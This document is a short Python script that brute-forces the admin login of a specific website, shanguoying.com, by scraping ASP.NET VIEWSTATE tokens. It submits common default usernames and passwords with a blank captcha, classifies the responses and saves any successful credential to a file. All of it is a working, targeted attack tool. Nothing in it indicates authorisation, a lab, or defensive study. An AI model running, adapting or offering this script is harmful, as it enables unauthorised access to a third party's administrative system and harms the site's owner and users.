#!/usr/bin/env python3
"""shanguoying.com ASP.NET admin brute force"""
import urllib.request as U, urllib.parse as P, ssl, re, sys

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

LOGIN_URL = "http://shanguoying.com/admin/login.aspx"

def get_viewstate(opener):
    req = U.Request(LOGIN_URL)
    req.add_header("User-Agent", "Mozilla/5.0")
    r = opener.open(req, timeout=8)
    body = r.read().decode("utf-8", errors="ignore")
    vs = re.search(r'VIEWSTATE" value="([^"]+)"', body)
    vg = re.search(r'VIEWSTATEGENERATOR" value="([^"]+)"', body)
    return (vs.group(1) if vs else "", vg.group(1) if vg else "")

def try_login(opener, vs, vg, user, pw, code):
    data = P.urlencode({
        "__VIEWSTATE": vs,
        "__VIEWSTATEGENERATOR": vg,
        "txtUserName": user,
        "txtUserPwd": pw,
        "txtCode": code,
        "btnSubmit": "登录"
    }).encode()
    req = U.Request(LOGIN_URL, data=data)
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent", "Mozilla/5.0")
    r = opener.open(req, timeout=8)
    body = r.read().decode("utf-8", errors="ignore")
    
    if "验证码" in body and "系统找不到" in body:
        return "captcha_not_found"
    if "验证码" in body and "错误" in body:
        return "captcha_wrong"
    if "密码" in body or "用户名" in body:
        return "bad_creds"
    if "login.aspx" not in body.lower() or "logout" in body.lower():
        return "SUCCESS"
    return "unknown"

cj = U.HTTPCookieProcessor(U.CookieJar())
opener = U.build_opener(cj)

users = ["admin", "administrator", "root", "sa", "dgy", "shanguoying"]
pwds = ["admin", "admin123", "admin888", "123456", "password", "admin666", "shanguoying", "dgy123"]

print("Starting shanguoying brute force", flush=True)

for user in users:
    vs, vg = get_viewstate(opener)
    if not vs:
        print(f"Failed get viewstate for {user}", flush=True)
        continue
    for pw in pwds:
        # Try without captcha first
        result = try_login(opener, vs, vg, user, pw, "")
        if result != "captcha_not_found":
            print(f"{user}:{pw} -> {result}", flush=True)
        if result == "SUCCESS":
            print(f"\n!!! LOGIN SUCCESS: {user}:{pw} !!!\n", flush=True)
            with open("/tmp/SGY_HIT.txt", "w") as f:
                f.write(f"SUCCESS {user}:{pw}")
            sys.exit(0)

print("All attempts done", flush=True)
